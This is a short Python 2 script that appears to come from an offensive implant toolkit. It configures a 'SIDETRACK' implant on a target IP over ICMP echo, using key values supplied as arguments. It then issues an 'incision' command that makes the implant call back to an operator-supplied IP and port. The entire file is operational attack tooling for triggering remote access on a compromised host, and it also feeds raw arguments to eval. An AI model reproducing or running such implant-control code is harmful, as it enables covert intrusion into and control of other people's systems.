#!/usr/bin/python
import base
import string
import sys


#
# Check the command line arguments
#
if len( sys.argv ) != 6:
    print "Usage %s: <target ip> \"cv1 cv2 cv3\" <time offset>" % \
          (sys.argv[0])
    print "                        <callback ip> <callback port>"
    sys.exit()

#
# Create the target class
#
target          = base.Target()
target.name     = 'reticulum'
target.project  = 'reticulum'
target.host     = 'reticulum'
target.ip       = sys.argv[1]
target.timediff = 0
target.protocol = base.GetProtocol('icmpecho')
key             = string.split(sys.argv[2])
cv1             = eval("0x%sL" %(key[0]))
cv2             = eval("0x%sL" %(key[1]))
cv3             = eval("0x%sL" %(key[2]))
target.AddImplant('sidetrack')
target.SetImplantOpt('sidetrack', 'key', (cv1, cv2, cv3))
target.SetImplantOpt('sidetrack', 'version', 1.0)

#
# Create a SIDETRACK implant
#
implant = base.GetImplant("SIDETRACK")

#
# Assign the implant and target to a session
#
session      = base.Session(target, implant)
session.name = 'reticulum'

#
# Get the necessary commands
#
ping     = session.GetCommand("ping")
timediff = session.GetCommand("timediff")
incision = session.GetCommand("incision")

# Set the time difference
if sys.argv[3] != '0':
    result = timediff.run(sys.argv[3])
    print result[1]

#
# Run the commands
#

#result = ping.run()
#print "%d: %s"%(result[0],result[1])

result = incision.run("%s:%s"%( sys.argv[4], sys.argv[5] ))
print result[1]
